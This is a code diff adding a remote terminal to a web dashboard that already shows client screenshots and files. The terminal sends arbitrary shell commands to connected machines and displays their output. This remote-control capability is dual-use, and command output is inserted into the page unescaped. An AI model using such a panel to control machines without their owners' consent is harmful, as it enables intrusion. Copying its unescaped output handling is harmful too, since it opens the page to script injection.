@@ -26,6 +26,7 @@
         <div id="detail-view" class="hidden">
             <button onclick="showGrid()" class="mb-4 px-4 py-2 bg-gray-700 rounded hover:bg-gray-600">← Back</button>
             <button onclick="showFiles()" class="mb-4 ml-2 px-4 py-2 bg-blue-700 rounded hover:bg-blue-600">📁 Files</button>
+            <button onclick="showTerminal()" class="mb-4 ml-2 px-4 py-2 bg-green-700 rounded hover:bg-green-600">💻 Terminal</button>
             <h2 id="detail-client-id" class="text-xl mb-4"></h2>
             <img id="detail-screenshot" class="w-full bg-black rounded" alt="Client screenshot">
         </div>
@@ -35,6 +36,23 @@
             <h2 id="file-browser-title" class="text-xl mb-4"></h2>
             <div id="file-list" class="bg-gray-800 rounded p-4"></div>
         </div>
+
+        <div id="terminal-view" class="hidden">
+            <button onclick="showDetail(selectedClient)" class="mb-4 px-4 py-2 bg-gray-700 rounded hover:bg-gray-600">← Back</button>
+            <h2 id="terminal-title" class="text-xl mb-4">Terminal</h2>
+            <div class="mb-4 flex gap-2">
+                <select id="shell-select" class="px-3 py-2 bg-gray-800 rounded text-white">
+                    <option value="">Detecting...</option>
+                </select>
+            </div>
+            <div id="terminal-output" class="bg-black rounded p-4 font-mono text-sm h-96 overflow-y-auto whitespace-pre-wrap"></div>
+            <div class="mt-4 flex gap-2">
+                <input type="text" id="terminal-input" class="flex-1 px-3 py-2 bg-gray-800 rounded text-white font-mono" placeholder="Enter command..." onkeypress="if(event.key==='Enter')executeCommand()">
+                <button id="run-btn" onclick="executeCommand()" class="px-4 py-2 bg-green-700 rounded hover:bg-green-600">Run</button>
+                <button id="kill-btn" onclick="killAllCommands()" class="px-4 py-2 bg-red-700 rounded hover:bg-red-600" disabled>Kill All</button>
+                <button onclick="clearTerminal()" class="px-4 py-2 bg-gray-700 rounded hover:bg-gray-600">Clear</button>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -43,6 +61,9 @@
         let selectedClient = null;
         let currentPath = '';
         let pendingFileRequests = {};
+        let pendingTerminalCommands = {};
+        let clientPlatformInfo = {};
+        let currentRunningReqId = null;
 
         function showGrid() {
             if (selectedClient) {
@@ -52,6 +73,7 @@
             document.getElementById('grid-view').classList.remove('hidden');
             document.getElementById('detail-view').classList.add('hidden');
             document.getElementById('file-view').classList.add('hidden');
+            document.getElementById('terminal-view').classList.add('hidden');
             selectedClient = null;
             currentPath = '';
         }
@@ -68,6 +90,7 @@
             document.getElementById('grid-view').classList.add('hidden');
             document.getElementById('detail-view').classList.remove('hidden');
             document.getElementById('file-view').classList.add('hidden');
+            document.getElementById('terminal-view').classList.add('hidden');
             document.getElementById('detail-client-id').textContent = clientId;
             console.log('DEBUG showDetail: Emitting start_viewing for', clientId);
             console.log('DEBUG WEBUI: socket.connected=', socket.connected, 'emitting start_viewing');
@@ -83,8 +106,75 @@
             }
             document.getElementById('detail-view').classList.add('hidden');
             document.getElementById('file-view').classList.remove('hidden');
+            document.getElementById('terminal-view').classList.add('hidden');
             currentPath = '';
             loadFileList('');
+        }
+
+        function showTerminal() {
+            console.log('DEBUG showTerminal: selectedClient=', selectedClient);
+            if (selectedClient) {
+                socket.emit('stop_viewing', {client_id: selectedClient});
+            }
+            document.getElementById('detail-view').classList.add('hidden');
+            document.getElementById('file-view').classList.add('hidden');
+            document.getElementById('terminal-view').classList.remove('hidden');
+            document.getElementById('terminal-title').textContent = `Terminal - ${selectedClient}`;
+            
+            // Request platform info from client
+            const requestId = 'platform_' + Date.now();
+            pendingTerminalCommands[requestId] = { action: 'get_platform' };
+            socket.emit('get_platform_info', {
+                client_id: selectedClient,
+                request_id: requestId
+            });
+        }
+
+        function updateTerminalButtons(isRunning) {
+            document.getElementById('run-btn').disabled = isRunning;
+            document.getElementById('kill-btn').disabled = !isRunning;
+        }
+
+        function executeCommand() {
+            const input = document.getElementById('terminal-input');
+            const command = input.value.trim();
+            if (!command) return;
+            
+            const shell = document.getElementById('shell-select').value;
+            const requestId = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            
+            const outputDiv = document.getElementById('terminal-output');
+            const prompt = shell.includes('powershell') ? 'PS>' : (shell.includes('cmd') ? '>' : '$');
+            outputDiv.innerHTML += `\n${prompt} ${command}\n`;
+            
+            outputDiv.innerHTML += '(executing...)\n';
+            pendingTerminalCommands[requestId] = { command, action: 'execute' };
+            
+            currentRunningReqId = requestId;
+            updateTerminalButtons(true);
+            
+            console.log('DEBUG WEBUI: executeCommand sending, client_id=', selectedClient, 'requestId=', requestId);
+            socket.emit('execute_command', {
+                client_id: selectedClient,
+                command: command,
+                shell: shell,
+                request_id: requestId
+            });
+            console.log('DEBUG WEBUI: executeCommand emitted for', requestId);
+            
+            input.value = '';
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        }
+
+        function killAllCommands() {
+            console.log('DEBUG WEBUI: killAllCommands sending, client_id=', selectedClient);
+            socket.emit('kill_all_commands', {
+                client_id: selectedClient
+            });
+        }
+
+        function clearTerminal() {
+            document.getElementById('terminal-output').innerHTML = '';
         }
 
         function loadFileList(path) {
@@ -355,6 +445,81 @@
                 // No pending request, might be a file list response
                 const path = data.path || '';
                 displayFileList(path, data);
+            }
+        });
+
+        socket.on('command_output', (data) => {
+            console.log('DEBUG WEBUI: Received command_output:', data);
+            const requestId = data.req_id;
+            const outputDiv = document.getElementById('terminal-output');
+            
+            if (data.all_killed) {
+                outputDiv.innerHTML += `(all commands killed: ${data.message})\n`;
+                currentRunningReqId = null;
+                pendingTerminalCommands = {};
+                updateTerminalButtons(false);
+            } else if (data.killed) {
+                outputDiv.innerHTML += `(killed: ${data.message})\n`;
+                currentRunningReqId = null;
+                updateTerminalButtons(false);
+            } else if (data.error) {
+                outputDiv.innerHTML += `<span class="text-red-400">Error: ${data.error}</span>\n`;
+                currentRunningReqId = null;
+                updateTerminalButtons(false);
+            } else {
+                // Remove the "(executing...)" text
+                const lastExecLine = outputDiv.innerHTML.lastIndexOf('(executing...)');
+                if (lastExecLine !== -1) {
+                    outputDiv.innerHTML = outputDiv.innerHTML.substring(0, lastExecLine);
+                }
+                
+                if (data.output) {
+                    outputDiv.innerHTML += data.output;
+                }
+                if (data.exit_code !== undefined && data.exit_code !== 0) {
+                    outputDiv.innerHTML += `\n<span class="text-yellow-400">(exit code: ${data.exit_code})</span>\n`;
+                }
+                
+                currentRunningReqId = null;
+                updateTerminalButtons(false);
+            }
+            
+            outputDiv.innerHTML += '\n';
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+            
+            if (requestId && pendingTerminalCommands[requestId]) {
+                delete pendingTerminalCommands[requestId];
+            }
+        });
+
+        socket.on('platform_info', (data) => {
+            console.log('DEBUG WEBUI: Received platform_info:', data);
+            
+            const requestId = data.req_id;
+            const shellSelect = document.getElementById('shell-select');
+            
+            if (data.platform && data.available_shells) {
+                clientPlatformInfo[selectedClient] = data;
+                
+                shellSelect.innerHTML = '';
+                
+                const defaultOption = document.createElement('option');
+                defaultOption.value = data.default_shell;
+                defaultOption.textContent = `${data.default_shell} (default)`;
+                shellSelect.appendChild(defaultOption);
+                
+                data.available_shells.forEach(shell => {
+                    if (shell !== data.default_shell) {
+                        const option = document.createElement('option');
+                        option.value = shell;
+                        option.textContent = shell;
+                        shellSelect.appendChild(option);
+                    }
+                });
+            }
+            
+            if (requestId && pendingTerminalCommands[requestId]) {
+                delete pendingTerminalCommands[requestId];
             }
         });
 
